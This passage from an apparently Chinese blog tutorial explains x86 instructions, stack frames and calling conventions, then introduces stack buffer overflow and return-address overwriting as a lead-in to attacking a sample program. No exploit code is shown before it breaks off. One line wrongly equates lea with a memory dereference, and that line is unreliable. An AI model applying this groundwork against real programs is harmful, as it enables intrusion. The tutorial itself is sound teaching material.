<p>为了让大家体验到这种漏洞的严重性,我决定一会就让大家攻击这个”模范”程序进行实验.</p>
</blockquote>
<p>&emsp;&emsp;介绍一下,剩下几个指令:</p>
<ul>
<li><code>sub</code>: 故名思意,减的意思.<code>sub eax, 0xc</code> 就是<code>eax = eax - 0xc</code>的意思<ul>
<li>AT&amp;T写法:<code>sub  $0xc, %eax</code>     </li>
<li>注:’$’开头的东西叫”立即数”,就是常数 </li>
</ul>
</li>
<li><code>add</code>: 与sub同理,不再赘述</li>
<li><code>lea</code>:这个指令比较神奇,她叫做”加载有效地址(Load Effective Address)”,其实就是C/C++里的取址操作,例如:<ul>
<li><code>lea eax, 13(esp)</code>等价于<code>eax = *(esp-13)</code></li>
<li>lea还可以用于简单的算数计算,例如:<ul>
<li><code>lea    rax, (rdi,rsi,4)</code>等价于<code>rax = rdi + rsi * 4</code></li>
</ul>
</li>
</ul>
</li>
<li><code>nop</code>: 啥也不干…理论上等价于….<code>mov eax, eax</code> ,主要起到延时的作用.  </li>
<li><p><code>jmp:</code> 故名思意,jump跳转的意思,用法<code>jmp 0x400ac</code>,意思是跳转到0x400ac这个地放执行指令.</p>
<ul>
<li>jmp一般会出现在: if-else语句  goto语句   各种loop</li>
<li>同系列还有<code>je  jne  jle  jge jl jg</code>,他们是”条件跳转”,若等于则跳转,若不等于则跳转,若小于等于则跳转,若大于等于则跳转……..自行脑补<blockquote>
<p>汇编中,循环一般使用jmp进行实现,其实就是jmp到循环开始的地方</p>
</blockquote>
</li>
</ul>
</li>
<li><p><code>cmp</code>: compare比较的意思,就是比较一下两个对象是否相等,用法:<code>cmp eax, 1</code>比较eax是否等于1,一般用于if-else语句,循环判断等等…</p>
</li>
</ul>
<blockquote>
<p>我只是粗略的介绍了一下各种指令,如果你想要深入学习可以读&lt;&lt;汇编语言&gt;&gt;王爽的那本,下面给一个汇编教程网站<a href="https://www.tutorialspoint.com/assembly_programming/assembly_basic_syntax.htm" target="_blank" rel="noopener">Assembly Language</a>,质量挺好.</p>
</blockquote>
<p>&emsp;&emsp;放一下上面那段程序的AT&amp;T代码:<br><img src="./pictures/example_atnt.png" alt="att"></p>
<p>接下来我们进行重点讲解,函数调用时栈的构造与内存变化及传参方式.</p>
<h4 id="函数调用时栈的构造"><a href="#函数调用时栈的构造" class="headerlink" title="函数调用时栈的构造"></a>函数调用时栈的构造</h4><p>&emsp;&emsp;程序本身就是各种函数的组合,因此了解函数的运行原理极为重要,这一部分是我们日后实施攻击的关键.</p>
<ol>
<li><p>关于寄存器使用的约定:  </p>
<p>&emsp;&emsp;程序寄存器组是唯一能被所有函数共享的资源。虽然某一时刻只有一个函数在执行，但需保证当某个函数调用其他函数时，被调函数不会修改或覆盖主调函数稍后会使用到的寄存器值。因此，IA32采用一套统一的寄存器使用约定，所有函数(包括库函数)调用都必须遵守该约定。<br>&emsp;&emsp;根据惯例，寄存器%eax、%edx和%ecx为主调函数保存寄存器(caller-saved registers)，当函数调用时，若主调函数希望保持这些寄存器的值，则必须在调用前显式地将其保存在栈中；被调函数可以覆盖这些寄存器，而不会破坏主调函数所需的数据。寄存器%ebx、%esi和%edi为被调函数保存寄存器(callee-saved registers)，即被调函数在覆盖这些寄存器的值时，必须先将寄存器原值压入栈中保存起来，并在函数返回前从栈中恢复其原值，因为主调函数可能也在使用这些寄存器。此外，被调函数必须保持寄存器%ebp和%esp，并在函数返回后将其恢复到调用前的值，亦即必须恢复主调函数的栈帧。<br>&emsp;&emsp;当然，这些工作都由编译器在幕后进行。不过在编写汇编程序时应注意遵守上述惯例。</p>
</li>
<li><p>栈帧结构:  </p>
</li>
</ol>
<p>&emsp;&emsp;函数调用经常是嵌套的，在同一时刻，堆栈中会有多个函数的信息。每个未完成运行的函数占用一个独立的连续区域，称作栈帧(Stack Frame)。栈帧是堆栈的逻辑片段，当调用函数时逻辑栈帧被压入堆栈, 当函数返回时逻辑栈帧被从堆栈中弹出。栈帧存放着函数参数，局部变量及恢复前一栈帧所需要的数据等。</p>
<p> &emsp;&emsp;编译器利用栈帧，使得函数参数和函数中局部变量的分配与释放对程序员透明。编译器将控制权移交函数本身之前，插入特定代码将函数参数压入栈帧中，并分配足够的内存空间用于存放函数中的局部变量。使用栈帧的一个好处是使得递归变为可能，因为对函数的每次递归调用，都会分配给该函数一个新的栈帧，这样就巧妙地隔离当前调用与上次调用。</p>
<p>&emsp;&emsp;栈帧的边界由栈帧基地址指针EBP和堆栈指针ESP界定(指针存放在相应寄存器中)。EBP指向当前栈帧底部(高地址)，在当前栈帧内位置固定；ESP指向当前栈帧顶部(低地址)，当程序执行时ESP会随着数据的入栈和出栈而移动。因此函数中对大部分数据的访问都基于EBP进行。</p>
<p>&emsp;&emsp;为更具描述性，以下称EBP为帧基指针， ESP为栈顶指针，并在引用汇编代码时分别记为%ebp和%esp。  </p>
<p>&emsp;&emsp;函数调用栈的典型内存布局如下图所示：</p>
<p><img src="./pictures/stack_frame1.jpg" alt="stack_frame1"></p>
<p>&emsp;&emsp;图中给出主调函数(caller)和被调函数(callee)的栈帧布局，”m(%ebp)”表示以EBP为基地址、偏移量为m字节的内存空间(中的内容)。该图基于两个假设：第一，函数返回值不是结构体或联合体，否则第一个参数将位于”12(%ebp)” 处；第二，每个参数都是4字节大小(栈的粒度为4字节)。在本文后续章节将就参数的传递和大小问题做进一步的探讨。  此外，函数可以没有参数和局部变量，故图中“Argument(参数)”和“Local Variable(局部变量)”不是函数栈帧结构的必需部分。</p>
<p>&emsp;&emsp;从图中可以看出，函数调用时入栈顺序为:</p>
<blockquote>
<p>实参N~1→主调函数返回地址→主调函数帧基指针EBP→被调函数局部变量1~N</p>
</blockquote>
<p>&emsp;&emsp;其中，主调函数将参数按照调用约定依次入栈(图中为从右到左)，然后将指令指针EIP入栈以保存主调函数的返回地址(下一条待执行指令的地址)。进入被调函数时，被调函数将主调函数的帧基指针EBP入栈，并将主调函数的栈顶指针ESP值赋给被调函数的EBP(作为被调函数的栈底)，接着改变ESP值来为函数局部变量预留空间。此时被调函数帧基指针指向被调函数的栈底。以该地址为基准，向上(栈底方向)可获取主调函数的返回地址、参数值，向下(栈顶方向)能获取被调函数的局部变量值，而该地址处又存放着上一层主调函数的帧基指针值。本级调用结束后，将EBP指针值赋给ESP，使ESP再次指向被调函数栈底以释放局部变量；再将已压栈的主调函数帧基指针弹出到EBP，并弹出返回地址到EIP。ESP继续上移越过参数，最终回到函数调用前的状态，即恢复原来主调函数的栈帧。如此递归便形成函数调用栈。</p>
<p>&emsp;&emsp;EBP指针在当前函数运行过程中(未调用其他函数时)保持不变。在函数调用前，ESP指针指向栈顶地址，也是栈底地址。在函数完成现场保护之类的初始化工作后，ESP会始终指向当前函数栈帧的栈顶，此时，若当前函数又调用另一个函数，则会将此时的EBP视为旧EBP压栈，而与新调用函数有关的内容会从当前ESP所指向位置开始压栈。</p>
<p>&emsp;&emsp;若需在函数中保存被调函数保存寄存器(如ESI、EDI)，则编译器在保存EBP值时进行保存，或延迟保存直到局部变量空间被分配。在栈帧中并未为被调函数保存寄存器的空间指定标准的存储位置。包含寄存器和临时变量的函数调用栈布局可能如下图所示：</p>
<p><img src="./pictures/stack_frame2.jpg" alt="stack_frame2"></p>
<blockquote>
<pre><code>在多线程(任务)环境，栈顶指针指向的存储器区域就是当前使用的堆栈。切换线程的一个重要工作，就是将栈顶指针设为当前线程的堆栈栈顶地址。
</code></pre></blockquote>
<p>&emsp;&emsp;内存地址从栈底到栈顶递减，压栈就是把ESP指针逐渐往地低址移动的过程。而结构体tStrt中的成员变量memberX地址=tStrt首地址+(memberX偏移量)，即越靠近tStrt首地址的成员变量其内存地址越小。因此，结构体成员变量的入栈顺序与其在结构体中声明的顺序相反。</p>
<p>&emsp;&emsp;函数调用以值传递时，传入的实参(locMain1~3)与被调函数内操作的形参(para1~3)两者存储地址不同，因此被调函数无法直接修改主调函数实参值(对形参的操作相当于修改实参的副本)。为达到修改目的，需要向被调函数传递实参变量的指针(即变量的地址)。</p>
<p>&emsp;&emsp;此外，”[locMain1,2,3] = [0, 0, 3]”是因为对四字节参数locMain2调用memset函数时，会从低地址向高地址连续清零8个字节，从而误将位于高地址locMain1清零。</p>
<p>&emsp;&emsp;注意，局部变量的布局依赖于编译器实现等因素。因此，当StackFrameContent函数中删除打印语句时，变量locVar3、locVar2和locVar1可能按照从高到低的顺序依次存储！而且，局部变量并不总在栈中，有时出于性能(速度)考虑会存放在寄存器中。数组/结构体型的局部变量通常分配在栈内存中。</p>
<blockquote>
<p>扩展阅读<br>函数局部变量布局方式</p>
<blockquote>
<p>与函数调用约定规定参数如何传入不同，局部变量以何种方式布局并未规定。编译器计算函数局部变量所需要的空间总数，并确定这些变量存储在寄存器上还是分配在程序栈上(甚至被优化掉)——某些处理器并没有堆栈。局部变量的空间分配与主调函数和被调函数无关，仅仅从函数源代码上无法确定该函数的局部变量分布情况。<br>基于不同的编译器版本(gcc3.4中局部变量按照定义顺序依次入栈，gcc4及以上版本则不定)、优化级别、目标处理器架构、栈安全性等，相邻定义的两个变量在内存位置上可能相邻，也可能不相邻，前后关系也不固定。若要确保两个对象在内存上相邻且前后关系固定，可使用结构体或数组定义。</p>
</blockquote>
</blockquote>
<ol start="3">
<li><p>Stack的变化  </p>
<p> 首先以32位程序为例.<br> 函数调用时的具体步骤如下：</p>
<ol>
<li><p>主调函数将被调函数所要求的参数，根据相应的函数调用约定，保存在运行时栈中。该操作会改变程序的栈指针。</p>
<blockquote>
<p>注：x86平台将参数压入调用栈中。而x86_64平台具有16个通用64位寄存器，故调用函数时前6个参数通常由寄存器传递，其余参数才通过栈传递.  </p>
</blockquote>
</li>
<li><p>主调函数将控制权移交给被调函数(使用call指令)。函数的返回地址(待执行的下条指令地址)保存在程序栈中(压栈操作隐含在call指令中)。  </p>
</li>
<li>若有必要，被调函数会设置帧基指针，并保存被调函数希望保持不变的寄存器值。</li>
<li>被调函数通过修改栈顶指针的值，为自己的局部变量在运行时栈中分配内存空间，并从帧基指针的位置处向低地址方向存放被调函数的局部变量和临时变量。</li>
<li>被调函数执行自己任务，此时可能需要访问由主调函数传入的参数。若被调函数返回一个值，该值通常保存在一个指定寄存器中(如EAX)。</li>
<li>一旦被调函数完成操作，为该函数局部变量分配的栈空间将被释放。这通常是步骤4的逆向执行。</li>
<li>恢复步骤3中保存的寄存器值，包含主调函数的帧基指针寄存器。</li>
<li>被调函数将控制权交还主调函数(使用ret指令)。根据使用的函数调用约定，该操作也可能从程序栈上清除先前传入的参数。</li>
<li>主调函数再次获得控制权后，可能需要将先前的参数从栈上清除。在这种情况下，对栈的修改需要将帧基指针值恢复到步骤1之前的值。</li>
</ol>
</li>
</ol>
<blockquote>
<p>步骤3与步骤4在函数调用之初常一同出现，统称为函数序(prologue)；步骤6到步骤8在函数调用的最后常一同出现，统称为函数跋(epilogue)。函数序和函数跋是编译器自动添加的开始和结束汇编代码，其实现与CPU架构和编译器相关。除步骤5代表函数实体外，其它所有操作组成函数调用。</p>
</blockquote>
<p> &emsp;&emsp;以下介绍函数调用过程中的主要指令(复习一下哈):</p>
<ul>
<li>压栈(push)：栈顶指针ESP减小4个字节；以字节为单位将寄存器数据(四字节，不足补零)压入堆栈，从高到低按字节依次将数据存入ESP-1、ESP-2、ESP-3、ESP-4指向的地址单元。  </li>
<li>出栈(pop)：栈顶指针ESP指向的栈中数据被取回到寄存器；栈顶指针ESP增加4个字节.  </li>
<li>返回(ret)：与call指令配合，用于从函数或过程返回。从栈顶弹出返回地址(之前call指令保存的下条指令地址)到EIP寄存器中，程序转到该地址处继续执行(此时ESP指向进入函数时的第一个参数)。若带立即数，ESP再加立即数(丢弃一些在执行call前入栈的参数)。使用该指令前，应使当前栈顶指针所指向位置的内容正好是先前call指令保存的返回地址。</li>
</ul>
<p>&emsp;&emsp;基于以上指令，使用C调用约定的被调函数典型的函数序和函数跋实现如下:</p>
<p><img src="./pictures/func.png" alt="func"></p>
<blockquote>
<p>若主调函数和调函数均未使用局部变量寄存器EDI、ESI和EBX，则编译器无须在函数序中对其压栈，以便提高程序的执行效率。</p>
</blockquote>
<p>&emsp;&emsp;参数压栈指令因编译器而异，如下两种压栈方式基本等效：</p>
<p><img src="./pictures/func1.png" alt="func1"></p>
<p>&emsp;&emsp;两种压栈方式均遵循C调用约定，但方式二中主调函数在调用返回后并未显式清理堆栈空间。因为在被调函数序阶段，编译器在栈顶为函数参数预先分配内存空间(sub指令)。函数参数被复制到栈中(而非压入栈中)，并未修改栈顶指针，故调用返回时主调函数也无需修改栈顶指针。gcc3.4(或更高版本)编译器采用该技术将函数参数传递至栈上，相比栈顶指针随每次参数压栈而多次下移，一次性设置好栈顶指针更为高效。设想连续调用多个函数时，方式二仅需预先分配一次参数内存(大小足够容纳参数尺寸和最大的函数即可)，后续调用无需每次都恢复栈顶指针。注意，函数被调用时，两种方式均使栈顶指针指向函数最左边的参数。本文不再区分两种压栈方式，”压栈”或”入栈”所提之处均按相应汇编代码理解，若无汇编则指方式二。</p>
<p>&emsp;&emsp;某些情况下，编译器生成的函数调用进入/退出指令序列并不按照以上方式进行。例如，若C函数声明为static(只在本编译单元内可见)且函数在编译单元内被直接调用，未被显示或隐式取地址(即没有任何函数指针指向该函数)，此时编译器确信该函数不会被其它编译单元调用，因此可随意修改其进/出指令序列以达到优化目的。</p>
<p>&emsp;&emsp;尽管使用的寄存器名字和指令在不同处理器架构上有所不同，但创建栈帧的基本过程一致。</p>
<p>&emsp;&emsp;注意，栈帧是运行时概念，若程序不运行，就不存在栈和栈帧。但通过分析目标文件中建立函数栈帧的汇编代码(尤其是函数序和函数跋过程)，即使函数没有运行，也能了解函数的栈帧结构。通过分析可确定分配在函数栈帧上的局部变量空间准确值，函数中是否使用帧基指针，以及识别函数栈帧中对变量的所有内存引用。</p>
<ol start="4">
<li>函数调用约定  </li>
</ol>
<p>&emsp;&emsp;创建一个栈帧的最重要步骤是主调函数如何向栈中传递函数参数。主调函数必须精确存储这些参数，以便被调函数能够访问到它们。函数通过选择特定的调用约定，来表明其希望以特定方式接收参数。此外，当被调函数完成任务后，调用约定规定先前入栈的参数由主调函数还是被调函数负责清除，以保证程序的栈顶指针完整性。<br>&emsp;&emsp;函数调用约定通常规定如下几方面内容：</p>
<pre><code>1. 函数参数的传递顺序和方式
</code></pre><p>最常见的参数传递方式是通过堆栈传递。主调函数将参数压入栈中，被调函数以相对于帧基指针的正偏移量来访问栈中的参数。对于有多个参数的函数，调用约定需规定主调函数将参数压栈的顺序(从左至右还是从右至左)。某些调用约定允许使用寄存器传参以提高性能。<br>    2.栈的维护方式<br>主调函数将参数压栈后调用被调函数体，返回时需将被压栈的参数全部弹出，以便将栈恢复到调用前的状态。该清栈过程可由主调函数负责完成，也可由被调函数负责完成。</p>
<pre><code>3. 名字修饰(Name-mangling)策略
</code></pre><p>又称函数名修饰(Decorated Name)规则。编译器在链接时为区分不同函数，对函数名作不同修饰。</p>
<blockquote>
<p>若函数之间的调用约定不匹配，可能会产生堆栈异常或链接错误等问题。因此，为了保证程序能正确执行，所有的函数调用均应遵守一致的调用约定。</p>
</blockquote>
<p>&emsp;&emsp;下面分别介绍常见的几种函数调用约定,你只需要记住解第一个cdel约定,剩下的作为知识扩展(内容较长,实在不想看就跳过吧,建议了解).  </p>
<ul>
<li>cdecl调用约定<ul>
<li>又称C调用约定，是C/C++编译器默认的函数调用约定。所有非C++成员函数和未使用stdcall或fastcall声明的函数都默认是cdecl方式。函数参数按照从右到左的顺序入栈，函数调用者负责清除栈中的参数，返回值在EAX中。由于每次函数调用都要产生清除(还原)堆栈的代码，故使用cdecl方式编译的程序比使用stdcall方式编译的程序大(后者仅需在被调函数内产生一份清栈代码)。但cdecl调用方式支持可变参数函数(即函数带有可变数目的参数，如printf)，且调用时即使实参和形参数目不符也不会导致堆栈错误。对于C函数，cdecl方式的名字修饰约定是在函数名前添加一个下划线；对于C++函数，除非特别使用extern “C”，C++函数使用不同的名字修饰方式。</li>
</ul>
</li>
</ul>
<blockquote>
<p>扩展阅读<br>可变参数函数支持条件</p>
<blockquote>
<p>若要支持可变参数的函数，则参数应自右向左进栈，并且由主调函数负责清除栈中的参数(参数出栈)。<br>首先，参数按照从右向左的顺序压栈，则参数列表最左边(第一个)的参数最接近栈顶位置。所有参数距离帧基指针的偏移量都是常数，而不必关心已入栈的参数数目。只要不定的参数的数目能根据第一个已明确的参数确定，就可使用不定参数。例如printf函数，第一个参数即格式化字符串可作为后继参数指示符。通过它们就可得到后续参数的类型和个数，进而知道所有参数的尺寸。当传递的参数过多时，以帧基指针为基准，获取适当数目的参数，其他忽略即可。若函数参数自左向右进栈，则第一个参数距离栈帧指针的偏移量与已入栈的参数数目有关，需要计算所有参数占用的空间后才能精确定位。当实际传入的参数数目与函数期望接受的参数数目不同时，偏移量计算会出错！<br>其次，调用函数将参数压栈，只有它才知道栈中的参数数目和尺寸，因此调用函数可安全地清栈。而被调函数永远也不能事先知道将要传入函数的参数信息，难以对栈顶指针进行调整。<br>C++为兼容C，仍然支持函数带有可变的参数。但在C++中更好的选择常常是函数多态。</p>
</blockquote>
</blockquote>
<ul>
<li><p>stdcall调用约定(微软命名)</p>
<ul>
<li>Pascal程序缺省调用方式，WinAPI也多采用该调用约定。stdcall调用约定主调函数参数从右向左入栈，除指针或引用类型参数外所有参数采用传值方式传递，由被调函数负责清除栈中的参数，返回值在EAX中。stdcall调用约定仅适用于参数个数固定的函数，因为被调函数清栈时无法精确获知栈上有多少函数参数；而且如果调用时实参和形参数目不符会导致堆栈错误。对于C函数，stdcall名称修饰方式是在函数名字前添加下划线，在函数名字后添加@和函数参数的大小，如_functionname@number。</li>
</ul>
</li>
<li><p>fastcall调用约定</p>
<ul>
<li>stdcall调用约定的变形，通常使用ECX和EDX寄存器传递前两个DWORD(四字节双字)类型或更少字节的函数参数，其余参数按照从右向左的顺序入栈，被调函数在返回前负责清除栈中的参数，返回值在 EAX 中。因为并不是所有的参数都有压栈操作，所以比stdcall和cdecl快些。编译器使用两个@修饰函数名字，后跟十进制数表示的函数参数列表大小(字节数)，如@function_name@number。需注意fastcall函数调用约定在不同编译器上可能有不同的实现，比如16位编译器和32位编译器。另外，在使用内嵌汇编代码时，还应注意不能和编译器使用的寄存器有冲突。</li>
</ul>
</li>
<li><p>thiscall调用约定</p>
<ul>
<li>C++类中的非静态函数必须接收一个指向主调对象的类指针(this指针)，并可能较频繁的使用该指针。主调函数的对象地址必须由调用者提供，并在调用对象非静态成员函数时将对象指针以参数形式传递给被调函数。编译器默认使用thiscall调用约定以高效传递和存储C++类的非静态成员函数的this指针参数。</li>
<li>thiscall调用约定函数参数按照从右向左的顺序入栈。若参数数目固定，则类实例的this指针通过ECX寄存器传递给被调函数，被调函数自身清理堆栈；若参数数目不定，则this指针在所有参数入栈后再入栈，主调函数清理堆栈。thiscall不是C++关键字，故不能使用thiscall声明函数，它只能由编译器使用。</li>
<li>注意，该调用约定特点随编译器不同而不同，g++中thiscall与cdecl基本相同，只是隐式地将this指针当作非静态成员函数的第1个参数，主调函数在调用返回后负责清理栈上参数；而在VC中，this指针存放在%ecx寄存器中，参数从右至左压栈，非静态成员函数负责清理栈上参数。</li>
</ul>
</li>
<li><p>naked call调用约定</p>
<ul>
<li><p>对于使用naked call方式声明的函数，编译器不产生保存(prologue)和恢复(epilogue)寄存器的代码，且不能用return返回返回值(只能用内嵌汇编返回结果)，故称naked call。该调用约定用于一些特殊场合，如声明处于非C/C++上下文中的函数，并由程序员自行编写初始化和清栈的内嵌汇编指令。注意，naked call并非类型修饰符，故该调用约定必须与__declspec同时使用，如VC下定义求和函数:</p>
<blockquote>
<p>代码示例如下(Windows采用Intel汇编语法，注释符为;)：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">__declspec(naked) int __stdcall function(int a, int b) &#123;</span><br><span class="line">     ;mov DestRegister, SrcImmediate(Intel) vs. movl $SrcImmediate, %DestRegister(AT&amp;T)</span><br><span class="line">     __asm mov eax, a</span><br><span class="line">     __asm add eax, b</span><br><span class="line">     __asm ret 8</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</blockquote>
</li>
</ul>
</li>
</ul>
<blockquote>
<p><code>__declspec</code>是微软关键字，其他系统上可能没有。 </p>
</blockquote>
<ul>
<li><p>pascal调用约定</p>
<ul>
<li>Pascal语言调用约定，参数按照从左至右的顺序入栈。Pascal语言只支持固定参数的函数，参数的类型和数量完全可知，故由被调函数自身清理堆栈。pascal调用约定输出的函数名称无任何修饰且全部大写。</li>
<li>Win3.X(16位)时支持真正的pascal调用约定；而Win9.X(32位)以后pascal约定由stdcall约定代替(以C约定压栈以Pascal约定清栈)。</li>
</ul>
<p>上述调用约定的主要特点如下表所示：<br><img src="./pictures/feature.png" alt="feature"></p>
</li>
</ul>
<blockquote>
<p>关于传参方法:</p>
</blockquote>
<ul>
<li>整型和指针参数的传递:<ul>
<li>整型参数与指针参数的传递方式相同，因为在32位x86处理器上整型与指针大小相同(均为四字节)。下表给出这两种类型的参数在栈帧中的位置关系。注意，该表基于tail函数的栈帧。</li>
</ul>
</li>
</ul>
<p><img src="./pictures/tail.png" alt="tail"></p>
<ul>
<li>浮点参数的传递:<ul>
<li>浮点参数的传递与整型类似，区别在于参数大小。x86处理器中浮点类型占8个字节，因此在栈中也需要占用8个字节。下表给出浮点参数在栈帧中的位置关系。图中，调用tail函数的第一个和第三个参数均为浮点类型，因此需各占用8个字节，三个参数共占用20个字节。表中word类型的大小是4字节。</li>
</ul>
</li>
</ul>
<p><img src="./pictures/tail1.png" alt="float"></p>
<ul>
<li><p>结构体和联合体参数的传递:</p>
<ul>
<li><p>结构体和联合体参数的传递与整型、浮点参数类似，只是其占用字节大小视数据结构的定义不同而异。x86处理器上栈宽是4字节，故结构体在栈上所占用的字节数为4的倍数。编译器会对结构体进行适当的填充以使得结构体大小满足4字节对齐的要求。</p>
</li>
<li><p>对于一些RISC处理器(如PowerPC)，其参数传递并不是全部通过栈来实现。PowerPC处理器寄存器中，R3～R10共8个寄存器用于传递整型或指针参数，F1～F8共8个寄存器用于传递浮点参数。当所需传递的参数少于8个时，不需要用到栈。结构体和long double参数的传递通过指针来完成，这与x86处理器完全不同。PowerPC的ABI规范中规定，结构体的传递采用指针方式，而不是像x86处理器那样将结构从一个函数栈帧中拷贝到另一个函数栈帧中，显然x86处理器的方式更低效。可见，PowerPC程序中，函数参数采用指向结构体的指针(而非结构体)并不能提高效率，不过通常这是良好的编程习惯。</p>
</li>
</ul>
</li>
<li><p>返回值的传递:</p>
<ul>
<li><p>函数返回值可通过寄存器传递。当被调用函数需要返回结果给调用函数时：</p>
<ol>
<li>若返回值不超过4字节(如int、short、char、指针等类型)，通常将其保存在EAX寄存器中，调用方通过读取EAX获取返回值。</li>
<li>若返回值大于4字节而小于8字节(如long long或_int64类型)，则通过EAX+EDX寄存器联合返回，其中EDX保存返回值高4字节，EAX保存返回值低4字节。</li>
<li>若返回值为浮点类型(如float和double)，则通过专用的协处理器浮点数寄存器栈的栈顶返回</li>
<li>若返回值为结构体或联合体，则主调函数向被调函数传递一个额外参数，该参数指向将要保存返回值的地址。即函数调用foo(p1, p2)被转化为foo(&amp;p0, p1, p2)，以引用型参数形式传回返回值。具体步骤可能为：a.主调函数将显式的实参逆序入栈；b.将接收返回值的结构体变量地址作为隐藏参数入栈(若未定义该接收变量，则在栈上额外开辟空间作为接收返回值的临时变量)；c. 被调函数将待返回数据拷贝到隐藏参数所指向的内存地址，并将该地址存入%eax寄存器。因此，在被调函数中完成返回值的赋值工作。</li>
</ol>
<blockquote>
<p>注意，函数如何传递结构体或联合体返回值依赖于具体实现。不同编译器、平台、调用约定甚至编译参数下可能采用不同的实现方法。如VC6编译器对于不超过8字节的小结构体，会通过EAX+EDX寄存器返回。而对于超过8字节的大结构体，主调函数在栈上分配用于接收返回值的临时结构体，并将地址通过栈传递给被调函数；被调函数根据返回值地址设置返回值(拷贝操作)；调用返回后主调函数根据需要，再将返回值赋值给需要的临时变量(二次拷贝)。实际使用中为提高效率，通常将结构体指针作为实参传递给被调函数以接收返回值。</p>
</blockquote>
<ol start="5">
<li>不要返回指向栈内存的指针，如返回被调函数内局部变量地址(包括局部数组名)。因为函数返回后，其栈帧空间被“释放”，原栈帧内分配的局部变量空间的内容是不稳定和不被保证的。</li>
</ol>
</li>
</ul>
</li>
</ul>
<p>&emsp;&emsp;函数返回值通过寄存器传递，无需空间分配等操作，故返回值的代价很低。基于此原因，C89规范中约定，不写明返回值类型的函数，返回值类型默认为int。但这会带来类型安全隐患，如函数定义时返回值为浮点数，而函数未声明或声明时未指明返回值类型，则调用时默认从寄存器EAX(而不是浮点数寄存器)中获取返回值，导致错误！因此在C++中，不写明返回值类型的函数返回值类型为void，表示不返回值。</p>
<blockquote>
<p>扩展阅读<br>GCC返回结构体和联合体</p>
<blockquote>
<p>通常GCC被配置为使用与目标系统一致的函数调用约定。这通过机器描述宏来实现。但是，在一些目标机上采用不同方式返回结构体和联合体的值。因此，使用PCC编译的返回这些类型的函数不能被使用GCC编译的代码调用，反之亦然。但这并未造成麻烦，因为很少有Unix库函数返回结构体或联合体。<br>GCC代码使用存放int或double类型返回值的寄存器来返回1、2、4或8个字节的结构体和联合体(GCC通常还将此类变量分配在寄存器中)。其它大小的结构体和联合体在返回时，将其存放在一个由调用者传递的地址中(通常在寄存器中)。<br>相比之下，PCC在大多目标机上返回任何大小的结构体和联合体时，都将数据复制到一个静态存储区域，再将该地址当作指针值返回。调用者必须将数据从那个内存区域复制到需要的地方。这比GCC使用的方法要慢，而且不可重入。<br>在一些目标机上(如RISC机器和80386)，标准的系统约定是将返回值的地址传给子程序。在这些机器上，当使用这种约定方法时，GCC被配置为与标准编译器兼容。这可能会对于1，2，4或8字节的结构体不兼容。<br>GCC使用系统的标准约定来传递参数。在一些机器上，前几个参数通过寄存器传递；在另一些机器上，所有的参数都通过栈传递。原本可在所有机器上都使用寄存器来传递参数，而且此法还可能显著提高性能。但这样就与使用标准约定的代码完全不兼容。所以这种改变只在将GCC作为系统唯一的C编译器时才实用。当拥有一套完整的GNU 系统，能够用GCC来编译库时，可在特定机器上实现寄存器参数传递。<br>在一些机器上(特别是SPARC)，一些类型的参数通过“隐匿引用”(invisible reference)来传递。这意味着值存储在内存中，将值的内存地址传给子程序。</p>
</blockquote>
</blockquote>
<p>&emsp;&emsp;到这里,我知道的关于函数调用栈的有关东西已经差不多讲完了,心态先别崩,最难的部分已经结束了,下面开始最有意思的部分.  </p>
<hr>
<h4 id="缓冲区溢出原理"><a href="#缓冲区溢出原理" class="headerlink" title="缓冲区溢出原理"></a>缓冲区溢出原理</h4><p>&emsp;&emsp;缓冲区说的通俗一点就是程序在运行时,可供使用的一部分内存.比如说stack和heap,还有一些存储常量的内存区域,比如bss段(bss segment)等等.下面我们来介绍一下最简单最经典的栈溢出(Stack Overflow).</p>
<h5 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h5><p>&emsp;&emsp;在linux下搭建漏洞利用的环境十分简单,只需要如下几个命令:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#有需求者自行换源</span></span><br><span class="line">sudo apt-get update &amp;&amp; apt-get upgrade</span><br><span class="line">sudo apt-get install build-essential gcc g++ make python-pip</span><br><span class="line">pip install pwntools</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;如果缺啥库请自行百度安装</p>
<h5 id="栈溢出原理"><a href="#栈溢出原理" class="headerlink" title="栈溢出原理"></a>栈溢出原理</h5><p>&emsp;&emsp;栈溢出指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变。这种问题是一种特定的缓冲区溢出漏，类似的还有堆溢出，bss 段溢出等溢出方式。栈溢出漏洞轻则可以使程序崩溃，重则可以使攻击者控制程序执行流程。此外，我们也不难发现，发生栈溢出的基本前提是</p>
<ul>
<li>程序向栈上写入数据</li>
<li>写入的数据长度没有被良好的控制</li>
</ul>
<h5 id="举个栗子"><a href="#举个栗子" class="headerlink" title="举个栗子"></a>举个栗子</h5><p>&emsp;&emsp;最经典的栈溢出利用是覆盖程序的返回地址,使其返回到攻击者想要的地址,<strong>需要确保这个地址所在的段有可执行权限</strong>,即权限为(–X)</p>
<blockquote>
<p>注:</p>
<blockquote>
<p>通常的计算机系统中,我们规定用户对文件有三种权限即<em>Read Write Execute</em>(RWX)读 写 可执行.在linux的终端里输入<code>ls -al</code>命令,结果如下:<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@Aurora:~/File/doc <span class="comment"># ls -al</span></span><br><span class="line">总用量 2028</span><br><span class="line">drwxr-xr-x 3 root root    4096 8月  22 21:58 .</span><br><span class="line">drwxr-xr-x 7 root root    4096 8月  23 23:35 ..</span><br><span class="line">-rw-r--r-- 1 root root   51486 8月  22 21:58 assembly.md</span><br><span class="line">-rw-r--r-- 1 root root 2007460 8月  22 21:55 assembly.pdf</span><br><span class="line">drwxr-xr-x 2 root root    4096 8月  13 00:17 pictures</span><br></pre></td></tr></table></figure></p>
</blockquote>
</blockquote>
<blockquote>
<blockquote>
